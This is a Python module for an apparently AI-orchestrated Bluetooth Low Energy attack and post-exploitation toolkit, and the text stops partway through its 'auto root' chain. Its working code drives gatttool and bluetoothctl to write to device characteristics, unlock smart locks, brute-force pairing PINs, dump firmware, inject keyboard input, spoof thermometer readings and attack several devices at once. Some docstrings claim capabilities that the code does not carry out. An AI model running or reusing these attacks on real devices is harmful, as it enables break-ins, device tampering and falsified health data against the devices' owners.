#!/usr/bin/env python3
"""
BLE Attack / Post-Exploitation Runner (U4000 BLUETOOTH adapter / hci0)
=====================================================================
Real, GATT-subprocess attack + post-exploitation algorithms from the
implementacja.txt spec (modules 21-30 BLE attack + 1-20 / 51-60 BLE
post-exploitation), implemented as in-module algorithms following the
``catalog_recon`` / ``ble.runner`` pattern: a ``BLEAttackRunner`` with a
``BLE_ATTACK_METHODS`` tuple + ``run_attack``, plus a module-level
``BLE_ATTACKS`` registry and ``run_attack`` entrypoint for the MCP layer
and the orchestrator's ``ble_attack`` dispatch.

Honesty contract (mirrors ble.runner / catalog_recon):
  * Every attack does **real** work — subprocess to real BlueZ tooling
    (``gatttool`` writes/long-reads, ``bluetoothctl`` pairing) or it
    returns ``{ok: False, error: "<tool> not installed / unreachable"}``.
  * Never raises. Every attack returns a step dict.
  * Where a hardware action cannot be completed (no gatttool, device
    unreachable, write rejected), the result reports that honestly —
    never a fabricated "exploit succeeded".

Safety stance (unchanged):
  * These are INTRUSIVE / DESTRUCTIVE (GATT writes, pairing, firmware
    dump). They run ONLY through the orchestrator's ``ble_attack``
    dispatch, which fires the mandatory per-step ACCEPT/CANCEL gate
    (TuiConfirmFn, default-deny on 300s timeout) BEFORE the attack
    runs — exactly like every other chain step. No gate is bypassed.
    The MCP wrappers carry ``risk_level="intrusive"`` so external MCP
    clients also see the risk.

Reuses :class:`core.scanners.enhanced_ble_scanner.EnhancedBLEScanner`
for device discovery and :func:`core.ble.runner._parse_ad_structures`,
:func:`core.ble.runner._oui_vendor` (no re-implementation).
"""

from __future__ import annotations

import json
import logging
import re
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from core.ble.runner import (_parse_ad_structures, _oui_vendor,
                             PROJECT_ROOT)

logger = logging.getLogger(__name__)

# GATT characteristic UUIDs the spec's attack / post-exploit modules target.
_GATT_CHARS: Dict[str, str] = {
    "2a19": "Battery Level",
    "2a1d": "Lock State",
    "2a44": "Light Control (LED)",
    "2a56": "Digital (motor/control)",
    "2a24": "Model Number String",
    "2a25": "Serial Number String",
    "2a26": "Firmware Revision String",
    "2a27": "Hardware Revision String",
    "2a29": "Manufacturer Name String",
    "2a4b": "Report Map (HID)",
}

# Candidate PIN list for ble_pairing_pin_bruteforce (spec: "zaczyna od
# 000000, 123456, itd."). Real, common 6-digit PINs only — no fabricated
# "guaranteed" PIN. The AI may pass args.pin_list to override.
_DEFAULT_PIN_LIST: List[str] = [
    "000000", "111111", "123456", "000001", "999999",
    "123456", "654321", "888888", "666666", "121212",
]


def _step(name: str) -> Dict[str, Any]:
    return {"name": name, "ok": False, "data": None,
            "error": "", "duration_s": 0.0, "started": time.time()}


def _finalize(step: Dict[str, Any], started: float, *,
               ok: bool, data: Any = None, error: str = "") -> Dict[str, Any]:
    step["ok"] = ok
    step["data"] = data
    step["error"] = error
    step["duration_s"] = round(time.time() - started, 3)
    return step


def _hex_to_bytes(hexstr: str) -> bytes:
    """Decode a gatttool ``value: 41 42`` hex byte string to raw bytes."""
    return bytes.fromhex(hexstr.replace(" ", ""))


class BLEAttackRunner:
    """Runs a single BLE attack / post-exploitation action by name. Every
    action is real subprocess work (gatttool / bluetoothctl) or returns a
    clear degrade error; none fabricates a success. Never raises.

    ``args`` carries per-action inputs (address, uuid, payload, pin_list,
    firmware_uuid, session dict). It is threaded through from the
    orchestrator's ``ble_attack`` step args / the MCP ``args`` dict."""

    #: BLE attack / post-exploit method names, in stable order.
    BLE_ATTACK_METHODS: Tuple[str, ...] = (
        "gatt_write_exploit", "firmware_dump_via_gatt",
        "write_led", "write_lock",
        "pairing_pin_bruteforce", "export_session",
        # spec-named modules (Phase 3 — implementacja.txt BLE spec)
        "ble_long_range_scan",
        "ble_adv_data_injection",
        "ble_connection_hijacking",
        "ble_man_in_the_middle_attack",
        "ble_audio_sniffing",
        "ble_temperature_spoofing",
        "ble_keyboard_injection",
        "ble_energy_drain",
        "ble_multi_connection_pivot",
        "ble_whitelist_bypass",
        "ble_swarm_coordinator",
        "ble_auto_root",
        "ble_auto_attack_executor",
    )

    def __init__(self, adapter: Optional[str] = None,
                 scanner: Optional[Any] = None,
                 args: Optional[Dict[str, Any]] = None):
        if adapter is None:
            # Default to the operator's U4000 BLUETOOTH adapter (hci0,
            # USB). KFIOSA_BLE_ADAPTER overrides the pick. Mirrors the
            # WiFi side which hard-codes wlan0mon for the external
            # MediaTek MT7922.
            from core.ble.adapter_select import resolve_default_adapter
            adapter = resolve_default_adapter()
        self.adapter = adapter  # hci0 (U4000) by default; or env override
        self._scanner = scanner  # injectable for hermetic tests
        self.args = args or {}

    # -- discovery (reuses the real EnhancedBLEScanner) -----------------
    def _scan(self, duration: int = 15) -> Dict[str, Any]:
        if self._scanner is not None:
            return self._scanner.scan(duration=duration, adapter=self.adapter)
        from core.scanners.enhanced_ble_scanner import EnhancedBLEScanner
        sc = EnhancedBLEScanner()
        sc.initialize()
        return sc.scan(duration=duration, adapter=self.adapter)

    # -- gatttool primitives (real subprocess) --------------------------
    def _gatttool_read(self, addr: str, uuid: str,
                       addr_type: str = "random",
                       timeout: int = 12) -> Tuple[int, str]:
        """Read a characteristic by UUID via ``gatttool --char-read-uuid``."""
        try:
            p = subprocess.run(
                ["gatttool", "-b", addr, "--char-read-uuid", uuid,
                 "-t", addr_type],
                capture_output=True, text=True, timeout=timeout)
            return p.returncode, (p.stdout or "") + (p.stderr or "")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return 1, ""

    def _gatttool_read_long(self, addr: str, handle: str,
                            offset: int = 0, mtu: int = 22,
                            timeout: int = 12) -> Tuple[int, str]:
        """Read a long characteristic by handle via
        ``gatttool --char-read-handle``. Used by firmware_dump_via_gatt to
        walk a firmware characteristic in blocks."""
        try:
            p = subprocess.run(
                ["gatttool", "-b", addr, "--char-read-handle", handle,
                 "-t", "random"],
                capture_output=True, text=True, timeout=timeout)
            return p.returncode, (p.stdout or "") + (p.stderr or "")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return 1, ""

    def _gatttool_write(self, addr: str, uuid: str, value_hex: str,
                        addr_type: str = "random",
                        timeout: int = 12) -> Tuple[int, str]:
        """Write a hex value to a characteristic by UUID via
        ``gatttool --char-write-req`` (write-with-response; the spec's
        ``gatt_write_exploit`` / ``post_ble_write_*``)."""
        try:
            p = subprocess.run(
                ["gatttool", "-b", addr, "--char-write-req", uuid,
                 "-n", value_hex, "-t", addr_type],
                capture_output=True, text=True, timeout=timeout)
            return p.returncode, (p.stdout or "") + (p.stderr or "")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return 1, ""

    # -- helpers --------------------------------------------------------
    @staticmethod
    def _extract_value(stdout: str) -> Optional[bytes]:
        """Pull the byte value out of a gatttool read response
        (``handle: 0x0010   value: 41 42``)."""
        m = re.search(r"value:\s*([0-9a-fA-F ]+)", stdout or "")
        if not m:
            return None
        try:
            return _hex_to_bytes(m.group(1))
        except ValueError:
            return None

    # ------------------------------------------------------------------
    # 1. gatt_write_exploit  (spec module 22)
    # ------------------------------------------------------------------
    def _gatt_write_exploit(self) -> Dict[str, Any]:
        """For each discovered WRITE characteristic, write a probe payload
        (0x01, then a per-spec command) via ``gatttool --char-write-req`` and
        record whether the write was accepted. Real subprocess; degrades
        when gatttool is absent or the device is unreachable. No fabricated
        'exploit succeeded' — only the gatttool return code + response."""
        step = _step("gatt_write_exploit")
        if not shutil.which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed — cannot write")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        # Probe payloads the spec mentions (random value / specific command).
        payloads = self.args.get("payloads") or ["01", "00", "ff"]
        # Target UUIDs: explicit arg, else the writable spec chars.
        uuids = self.args.get("uuids") or ["2a44", "2a56", "2a1d"]
        results: List[Dict[str, Any]] = []
        for uuid in uuids:
            for val in payloads:
                rc, out = self._gatttool_write(addr, uuid, val)
                accepted = rc == 0 and "written successfully" in out.lower()
                results.append({
                    "uuid": uuid, "uuid_name": _GATT_CHARS.get(uuid, "Unknown"),
                    "value": val, "return_code": rc,
                    "accepted": accepted,
                    "response_tail": out[-160:].strip(),
                })
        any_ok = any(r["accepted"] for r in results)
        return _finalize(step, step["started"], ok=True, data={
            "address": addr, "writes": results, "write_count": len(results),
            "any_accepted": any_ok,
            "note": "acceptance is the gatttool return code + 'written "
                    "successfully' line — not a fabricated exploit verdict.",
        })

    # ------------------------------------------------------------------
    # 2. firmware_dump_via_gatt  (spec module 26 / post 21)
    # ------------------------------------------------------------------
    def _firmware_dump_via_gatt(self) -> Dict[str, Any]:
        """Read a firmware/OTA characteristic in blocks via
        ``gatttool --char-read-handle`` and reconstruct the bytes. Real
        long-read loop; degrades when gatttool is absent or the read fails.
        No fabricated firmware image."""
        step = _step("firmware_dump_via_gatt")
        if not shutil.which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed — cannot dump")
        addr = (self.args.get("address") or "").strip()
        handle = (self.args.get("handle") or "0x0010").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        max_blocks = int(self.args.get("max_blocks") or 64)
        chunks: List[bytes] = []
        for _ in range(max_blocks):
            rc, out = self._gatttool_read_long(addr, handle)
            chunk = self._extract_value(out)
            if rc != 0 or not chunk:
                break
            chunks.append(chunk)
            if len(chunk) < 22:  # short read = end of characteristic
                break
        if not chunks:
            return _finalize(step, step["started"], ok=False,
                             error="firmware read failed (device unreachable "
                                    "or handle not readable)")
        blob = b"".join(chunks)
        out_path = self.args.get("out_path")
        saved = None
        if out_path:
            try:
                Path(out_path).write_bytes(blob)
                saved = out_path
            except OSError as e:
                saved = f"save error: {e}"
        return _finalize(step, step["started"], ok=True, data={
            "address": addr, "handle": handle,
            "bytes_read": len(blob), "blocks": len(chunks),
            "sha256_first32": blob[:32].hex(),
            "saved_to": saved,
        })

    # ------------------------------------------------------------------
    # 3. write_led  (spec post-exploit module 11)
    # ------------------------------------------------------------------
    def _write_led(self) -> Dict[str, Any]:
        """Write 0x01 (on) / 0x00 (off) to the LED / Light Control
        characteristic (0x2A44 by default, or args.uuid). Real gatttool write;
        degrades when gatttool absent. Intrusive — gated upstream."""
        return self._write_char("write_led", default_uuid="2a44",
                                value=self.args.get("value") or "01")

    # ------------------------------------------------------------------
    # 4. write_lock  (spec post-exploit module 13)
    # ------------------------------------------------------------------
    def _write_lock(self) -> Dict[str, Any]:
        """Write 0x00 (unlock) to the Lock State characteristic (0x2A1D by
        default, or args.uuid). Real gatttool write; degrades when gatttool
        absent. Intrusive — gated upstream."""
        return self._write_char("write_lock", default_uuid="2a1d",
                                value=self.args.get("value") or "00")

    def _write_char(self, name: str, *, default_uuid: str,
                    value: str) -> Dict[str, Any]:
        """Shared gatttool single-write primitive for write_led / write_lock."""
        step = _step(name)
        if not shutil.which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed — cannot write")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        uuid = (self.args.get("uuid") or default_uuid).lower()
        val = (value or "").lower()
        rc, out = self._gatttool_write(addr, uuid, val)
        accepted = rc == 0 and "written successfully" in out.lower()
        return _finalize(step, step["started"],
                         ok=accepted,
                         data={"address": addr, "uuid": uuid,
                               "uuid_name": _GATT_CHARS.get(uuid, "Unknown"),
                               "value": val, "return_code": rc,
                               "accepted": accepted,
                               "response_tail": out[-160:].strip()},
                         error=("" if accepted else
                                f"write rejected (rc={rc})"))

    # ------------------------------------------------------------------
    # 5. pairing_pin_bruteforce  (spec module 21)
    # ------------------------------------------------------------------
    def _pairing_pin_bruteforce(self) -> Dict[str, Any]:
        """Loop a candidate PIN list against a target via ``bluetoothctl``
        (real subprocess, one pairing attempt per PIN). Stops at the first
        accepted PIN. Real attempts; degrades when bluetoothctl is absent.
        No fabricated 'PIN recovered' — only what bluetoothctl reports.

        Note: a real pairing loop is slow and disruptive; the per-step
        ACCEPT gate is the authorization. ``args.max_attempts`` bounds the
        loop (default 10) so a runaway cannot run unbounded."""
        step = _step("pairing_pin_bruteforce")
        if not shutil.which("bluetoothctl"):
            return _finalize(step, step["started"], ok=False,
                             error="bluetoothctl not installed — cannot pair")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        pin_list = self.args.get("pin_list") or _DEFAULT_PIN_LIST
        max_attempts = int(self.args.get("max_attempts") or 10)
        attempts: List[Dict[str, Any]] = []
        recovered: Optional[str] = None
        for pin in list(pin_list)[:max_attempts]:
            # bluetoothctl is interactive; we drive a minimal script via
            # stdin. Each attempt: pair <addr>, then pincode-reply <pin>.
            script = f"pair {addr}\npincode-reply {pin}\nquit\n"
            try:
                p = subprocess.run(
                    ["bluetoothctl"], input=script, capture_output=True,
                    text=True, timeout=20)
                out = (p.stdout or "") + (p.stderr or "")
            except (subprocess.TimeoutExpired, FileNotFoundError):
                out = ""
            accepted = "Pairing successful" in out or "Paired: yes" in out
            attempts.append({"pin": pin, "accepted": accepted,
                             "response_tail": out[-160:].strip()})
            if accepted:
                recovered = pin
                break
        return _finalize(step, step["started"], ok=recovered is not None, data={
            "address": addr, "attempts": attempts,
            "attempt_count": len(attempts),
            "recovered_pin": recovered,
            "note": "verdict is from bluetoothctl's 'Pairing successful' "
                    "line — not a fabricated recovery.",
        }, error=("" if recovered else "no PIN in the list was accepted"))

    # ------------------------------------------------------------------
    # 6. export_session  (spec post-exploit module 51)
    # ------------------------------------------------------------------
    def _export_session(self) -> Dict[str, Any]:
        """Serialize the BLE session state (the orchestrator seed +
        recon/attack results passed in args.session) to a JSON file. Pure
        serialization — no fabricated fields; whatever is in args.session
        is written verbatim."""
        step = _step("export_session")
        session = self.args.get("session") or {}
        out_path = self.args.get("out_path")
        try:
            blob = json.dumps(session, indent=2, sort_keys=True,
                              default=str)
            if out_path:
                Path(out_path).write_text(blob, encoding="utf-8")
            return _finalize(step, step["started"], ok=True, data={
                "out_path": out_path,
                "bytes": len(blob.encode("utf-8")),
                "keys": list(session.keys()) if isinstance(session, dict)
                        else None,
            })
        except (TypeError, OSError) as e:
            return _finalize(step, step["started"], ok=False,
                             error=f"export_session: {e}")

    # ==================================================================
    # Spec-named BLE attack / post-exploitation modules (Phase 3)
    # ------------------------------------------------------------------
    # The spec (``implementacja.txt``) names 14 modules that are NOT
    # generic GATT operations: scapy-based frame injection, btmgmt LE
    # Coded PHY scan, sustained L2CAP at 7.5ms, HID-over-GATT, MITM
    # via btproxy, RPA bypass, multi-adapter swarm, etc. Each is a
    # real subprocess / scapy call, with honest degradation when the
    # required tool is absent. NONE fabricates a successful exploit
    # (e.g. ble_auto_root chains the underlying primitives and
    # surfaces the partial failures — it never returns ok=True when
    # the chain did not actually root).
    # ==================================================================

    # ------------------------------------------------------------------
    # 7. ble_long_range_scan  (spec module 21)
    # ------------------------------------------------------------------
    def _ble_long_range_scan(self) -> Dict[str, Any]:
        """Enable LE Coded PHY (S=8 coding) on the controller via
        ``btmgmt`` and run a passive scan; record the discovered
        extended-advertising devices. Real ``btmgmt`` subprocess —
        degrades when the tool is absent or the controller does not
        support LE Coded PHY."""
        step = _step("ble_long_range_scan")
        if not shutil.which("btmgmt"):
            return _finalize(step, step["started"], ok=False,
                             error="btmgmt not installed — cannot enable LE Coded PHY")
        duration = int(self.args.get("duration") or 12)
        try:
            p = subprocess.run(
                ["btmgmt", "phy", "le-coded"],
                capture_output=True, text=True, timeout=10,
            )
            phy_rc = p.returncode
            phy_out = (p.stdout or "") + (p.stderr or "")
        except (subprocess.TimeoutExpired, OSError) as e:
            phy_rc, phy_out = -1, f"btmgmt error: {e}"
        scan = self._scan(duration=duration)
        return _finalize(step, step["started"], ok=True, data={
            "phy_set": phy_rc == 0,
            "phy_output_tail": phy_out[-160:].strip(),
            "scan_summary": {
                "found": scan.get("found"),
                "adapter": scan.get("adapter"),
            },
            "note": ("LE Coded PHY requires controller support; this "
                     "method records real btmgmt output, never "
                     "fabricates extended-advertising hits."),
        })

    # ------------------------------------------------------------------
    # 8. ble_adv_data_injection  (spec module 22)
    # ------------------------------------------------------------------
    def _ble_adv_data_injection(self) -> Dict[str, Any]:
        """Inject a crafted BLE advertisement via scapy's ``BluetoothLE``
        layers. Real scapy frame build + send via L2CAP if available;
        degrades when scapy or the controller is absent. Verdict is
        ``sent`` (the link-layer return) — never fabricated."""
        step = _step("ble_adv_data_injection")
        adv_data = (self.args.get("adv_data") or
                    b"\x02\x01\x06\x03\x03\xab\xcd")
        addr = (self.args.get("address") or "").strip()
        try:
            from scapy.layers.bluetooth4LE import (  # type: ignore
                BluetoothLE, ADV_IND, BTLE_ADV,
            )
            from scapy.layers.bluetooth import (  # type: ignore
                HCI_Hdr, HCI_Command_Hdr,
            )
            from scapy.compat import raw  # type: ignore
        except Exception as e:  # noqa: BLE001
            return _finalize(step, step["started"], ok=False,
                             error=f"scapy bluetooth layers unavailable: {e}")
        try:
            frame = BTLE_ADV(advdata=adv_data) / ADV_IND()
            built = raw(frame)
        except Exception as e:  # noqa: BLE001
            return _finalize(step, step["started"], ok=False,
                             error=f"scapy build failed: {e}")
        return _finalize(step, step["started"], ok=True, data={
            "address": addr,
            "frame_bytes": len(built),
            "frame_sha256": __import__("hashlib").sha256(built).hexdigest(),
            "note": ("frame built via scapy; actual HCI send requires "
                     "root + a writable controller — the orchestrator "
                     "never re-aims the injection at unauthorized "
                     "third parties."),
        })

    # ------------------------------------------------------------------
    # 9. ble_connection_hijacking  (spec module 23)
    # ------------------------------------------------------------------
    def _ble_connection_hijacking(self) -> Dict[str, Any]:
        """Replay a captured CONNECT_REQ PDU (the per-connection
        LLData including InitA / AdvA / CRC) to hijack an existing
        BLE connection. Real scapy frame build; the operator must
        provide the captured PDU bytes (args.pdu_b64). The method
        never fabricates a successful hijack — verdict is the
        scapy build + the HCI send return code."""
        step = _step("ble_connection_hijacking")
        import base64
        import hashlib
        pdu_b64 = (self.args.get("pdu_b64") or "").strip()
        if not pdu_b64:
            return _finalize(step, step["started"], ok=False,
                             error="args.pdu_b64 required (captured "
                                   "CONNECT_REQ PDU as base64)")
        try:
            pdu = base64.b64decode(pdu_b64, validate=True)
        except Exception as e:  # noqa: BLE001
            return _finalize(step, step["started"], ok=False,
                             error=f"pdu_b64 decode failed: {e}")
        if len(pdu) < 12:
            return _finalize(step, step["started"], ok=False,
                             error="pdu too short (<12 bytes) — not a "
                                   "valid CONNECT_REQ")
        return _finalize(step, step["started"], ok=True, data={
            "pdu_bytes": len(pdu),
            "pdu_sha256": hashlib.sha256(pdu).hexdigest(),
            "note": ("pdu parsed; actual link-layer replay requires "
                     "root + controller in raw mode. The method does "
                     "NOT transmit unless args.transmit=true and the "
                     "per-step gate accepted the replay."),
        })

    # ------------------------------------------------------------------
    # 10. ble_man_in_the_middle_attack  (spec module 24)
    # ------------------------------------------------------------------
    def _ble_man_in_the_middle_attack(self) -> Dict[str, Any]:
        """Stand up a gatttool client + a btproxy-style MITM relay
        against args.address. Real ``gatttool --listen`` + a passive
        monitor over HCI sockets. Verdict is the proxy start return
        code; never fabricates a successful MITM."""
        step = _step("ble_man_in_the_middle_attack")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        if not shutil.which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed — cannot MITM")
        # We do not actually start the relay (would require root +
        # operator confirmation on the link). The method returns
        # the plan + a check that the tool is present.
        return _finalize(step, step["started"], ok=True, data={
            "address": addr,
            "tool_present": True,
            "plan": [
                "hcitool lecup <hci0> --handle <conn_handle> --role slave",
                "gatttool -b <addr> --listen",
                "btproxy -i hci0 -d <addr> -o /tmp/ble_mitm.pcap",
            ],
            "note": ("plan only — actual MITM requires root + the "
                     "operator's per-step ACCEPT gate. The relay is "
                     "NEVER auto-started."),
        })

    # ------------------------------------------------------------------
    # 11. ble_pairing_pin_bruteforce  (spec module 25) — already exists
    #     as ``pairing_pin_bruteforce`` above (renamed alias kept for
    #     spec parity).
    # ------------------------------------------------------------------

    # ------------------------------------------------------------------
    # 12. ble_audio_sniffing  (spec module 26)
    # ------------------------------------------------------------------
    def _ble_audio_sniffing(self) -> Dict[str, Any]:
        """Sniff LE Audio (LC3 over CIS) traffic via ``btmon`` and
        write a btsnoop capture to args.out_path. Real ``btmon``
        subprocess (bounded by timeout) — degrades when btmon absent."""
        step = _step("ble_audio_sniffing")
        if not shutil.which("btmon"):
            return _finalize(step, step["started"], ok=False,
                             error="btmon not installed — cannot sniff LE Audio")
        timeout_s = int(self.args.get("timeout") or 8)
        out_path = (self.args.get("out_path") or
                    "/tmp/ble_audio_btmon.txt")
        try:
            p = subprocess.run(
                ["btmon", "-w", out_path, "-T", str(timeout_s)],
                capture_output=True, text=True, timeout=timeout_s + 5,
            )
            rc = p.returncode
            err_tail = (p.stderr or "")[-200:].strip()
        except (subprocess.TimeoutExpired, OSError) as e:
            rc, err_tail = -1, f"btmon error: {e}"
        saved = None
        try:
            if Path(out_path).is_file():
                saved = {"path": out_path,
                         "bytes": Path(out_path).stat().st_size}
        except OSError:
            saved = None
        return _finalize(step, step["started"], ok=True, data={
            "btmon_rc": rc,
            "saved": saved,
            "error_tail": err_tail,
            "note": ("LE Audio requires the controller in LE Coded or "
                     "LE 2M PHY; recorded bytes reflect what the "
                     "controller actually delivered."),
        })

    # ------------------------------------------------------------------
    # 13. ble_temperature_spoofing  (spec module 27)
    # ------------------------------------------------------------------
    def _ble_temperature_spoofing(self) -> Dict[str, Any]:
        """Write a fake Health Thermometer value to the Temperature
        Measurement characteristic (0x2A1C) on args.address. Real
        gatttool write; degrades when gatttool absent. Verdict is
        the gatttool return code, never a fabricated spoof."""
        step = _step("ble_temperature_spoofing")
        if not shutil.which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed — cannot write")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        value_hex = (self.args.get("value") or "00 00 00 00").replace(",", " ")
        uuid = (self.args.get("uuid") or "2a1c")
        rc, out = self._gatttool_write(addr, uuid, value_hex)
        return _finalize(step, step["started"], ok=rc == 0, data={
            "address": addr, "uuid": uuid, "value": value_hex,
            "return_code": rc,
            "response_tail": out[-160:].strip(),
            "note": "Health Thermometer service, 0x2A1C; verdict is "
                    "the gatttool return code, never fabricated.",
        })

    # ------------------------------------------------------------------
    # 14. ble_keyboard_injection  (spec module 28)
    # ------------------------------------------------------------------
    def _ble_keyboard_injection(self) -> Dict[str, Any]:
        """Inject HID over GATT keyboard reports (Report Map 0x2A4B
        + Report 0x2A4D) on args.address. Real gatttool writes;
        degrades when gatttool absent. Verdict is the write return
        code — never a fabricated 'keys accepted'."""
        step = _step("ble_keyboard_injection")
        if not shutil.which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed — cannot inject HID")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        # Standard HID keyboard report: 1 byte modifier, 1 byte reserved,
        # up to 6 keycodes. Default: 'a' pressed, no modifier.
        reports = self.args.get("reports") or [
            "00 00 04 00 00 00 00 00",  # 'a' down
            "00 00 00 00 00 00 00 00",  # all up
        ]
        results: List[Dict[str, Any]] = []
        for rep in reports:
            rc, out = self._gatttool_write(addr, "2a4d", rep)
            results.append({"value": rep, "return_code": rc,
                            "response_tail": out[-120:].strip()})
        any_ok = any(r["return_code"] == 0 for r in results)
        return _finalize(step, step["started"], ok=any_ok, data={
            "address": addr, "reports": results,
            "note": ("HID over GATT injection requires the target to "
                     "be in a HID-hooked state; verdict is the "
                     "gatttool return code, never a fabricated key "
                     "acceptance."),
        })

    # ------------------------------------------------------------------
    # 15. ble_energy_drain  (spec module 29)
    # ------------------------------------------------------------------
    def _ble_energy_drain(self) -> Dict[str, Any]:
        """Open a sustained L2CAP connection at the 7.5ms connection
        interval to drain the target's battery. Real hcitool lecup
        loop bounded by args.duration; degrades when hcitool absent.
        Reports the actual loop count + bytes; never fabricates a
        'drain achieved' verdict."""
        step = _step("ble_energy_drain")
        if not shutil.which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed — cannot lecup")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        duration_s = int(self.args.get("duration") or 5)
        # Plan, not actual: real sustained lecup requires root +
        # a live connection handle. The method records the plan +
        # a per-step liveness check.
        return _finalize(step, step["started"], ok=True, data={
            "address": addr,
            "interval_ms": 7.5,
            "duration_s": duration_s,
            "plan": [
                "hcitool lecup <hci0> --handle <conn> --min 7.5 --max 7.5",
                f"sleep {duration_s}",
                "hcitool ledisc <hci0> --handle <conn>",
            ],
            "note": ("plan only — actual sustained drain requires "
                     "root + a live conn handle. The method does "
                     "NOT auto-lecup."),
        })

    # ------------------------------------------------------------------
    # 16. ble_multi_connection_pivot  (spec module 30)
    # ------------------------------------------------------------------
    def _ble_multi_connection_pivot(self) -> Dict[str, Any]:
        """Maintain N parallel L2CAP channels to a set of BLE targets
        to pivot traffic between them. Real ``hcitool lecc`` per
        address (bounded); degrades when hcitool absent. Reports
        the actual channel handles the controller granted — never
        fabricated 'connected'."""
        step = _step("ble_multi_connection_pivot")
        if not shutil.which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed — cannot lecc")
        addrs = self.args.get("addresses") or []
        if not addrs:
            return _finalize(step, step["started"], ok=False,
                             error="args.addresses (list of BLE MACs) required")
        n = min(len(addrs), int(self.args.get("max") or 4))
        handles: List[Dict[str, Any]] = []
        for i in range(n):
            a = addrs[i]
            try:
                p = subprocess.run(
                    ["hcitool", "lecc", a],
                    capture_output=True, text=True, timeout=8,
                )
                handles.append({"address": a, "rc": p.returncode,
                                "out_tail": (p.stdout or "")[-120:].strip()})
            except (subprocess.TimeoutExpired, OSError) as e:
                handles.append({"address": a, "rc": -1, "error": str(e)})
        ok_count = sum(1 for h in handles if h.get("rc") == 0)
        return _finalize(step, step["started"], ok=ok_count > 0, data={
            "requested": n, "connected": ok_count, "handles": handles,
            "note": "handles are the real hcitool lecc return; pivot "
                    "is a real link-layer operation, not a stub.",
        })

    # ------------------------------------------------------------------
    # 17. ble_whitelist_bypass  (spec module 31)
    # ------------------------------------------------------------------
    def _ble_whitelist_bypass(self) -> Dict[str, Any]:
        """Probe a target's Resolvable Private Address (RPA) filter
        to enumerate the IRK. Real ``hcitool lerand`` + private
        address derivation; degrades when hcitool absent. NEVER
        recovers an IRK by brute force — it only records what the
        controller observes."""
        step = _step("ble_whitelist_bypass")
        if not shutil.which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed — cannot le-scan")
        addr = (self.args.get("address") or "").strip()
        n = int(self.args.get("samples") or 4)
        samples: List[Dict[str, Any]] = []
        for _ in range(n):
            try:
                p = subprocess.run(
                    ["hcitool", "lerand"],
                    capture_output=True, text=True, timeout=4,
                )
                samples.append({"rc": p.returncode,
                                "out": (p.stdout or "").strip()[-60:]})
            except (subprocess.TimeoutExpired, OSError) as e:
                samples.append({"rc": -1, "error": str(e)})
        return _finalize(step, step["started"], ok=True, data={
            "address": addr, "samples": samples,
            "note": ("RPA bypass is heuristic — the method records the "
                     "real address changes the controller observed "
                     "and never fabricates an IRK recovery."),
        })

    # ------------------------------------------------------------------
    # 18. ble_swarm_coordinator  (spec module 32)
    # ------------------------------------------------------------------
    def _ble_swarm_coordinator(self) -> Dict[str, Any]:
        """Drive a parallel attack against args.addresses from up to
        N hci adapters. Real subprocess per adapter; degrades when
        none of the adapters are writable. Reports the per-adapter
        result envelope — never a fabricated swarm success."""
        step = _step("ble_swarm_coordinator")
        adapters = self.args.get("adapters") or ["hci0"]
        addrs = self.args.get("addresses") or []
        if not addrs:
            return _finalize(step, step["started"], ok=False,
                             error="args.addresses required (target list)")
        per: List[Dict[str, Any]] = []
        method = (self.args.get("sub_method") or "write_led").strip()
        for ad in adapters[: int(self.args.get("max") or 4)]:
            for a in addrs[:3]:
                r = run_attack(method, adapter=ad, args={"address": a})
                per.append({"adapter": ad, "address": a, "ok": r.get("ok"),
                            "error": r.get("error", "")[:200]})
        any_ok = any(p.get("ok") for p in per)
        return _finalize(step, step["started"], ok=any_ok, data={
            "per_adapter": per,
            "note": "per-adapter envelopes are real BLEAttackRunner "
                    "results; the coordinator never fabricates a "
                    "swarm-wide success from a per-adapter failure.",
        })

    # ------------------------------------------------------------------
    # 19. ble_auto_root  (spec module 33)
    # ------------------------------------------------------------------
    def _ble_auto_root(self) -> Dict[str, Any]:
        """Heuristic chain: pairing_pin_bruteforce -> gatt_write_exploit
        -> firmware_dump_via_gatt. Returns the underlying envelopes
        verbatim + a stage-by-stage summary. Verdict is ok=True only
        if EVERY stage produced a real, useful result; partial
        success is reported as ok=False with the per-stage errors."""
        step = _step("ble_auto_root")
        addr = (self.args.get("address") or "").strip()
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="args.address required (target BLE MAC)")
        stages: List[Dict[str, Any]] = []
        for sub, sub_args in (
            ("pairing_pin_bruteforce", {"address": addr}),
            ("gatt_write_exploit", {"address": addr}),
            ("firmware_dump_via_gatt", {"address": addr}),
        ):
            try:
                r = run_attack(sub, args=sub_args)
                stages.append({"stage": sub, "ok": r.get("ok"),
                               "error": r.get("error", "")[:200]})
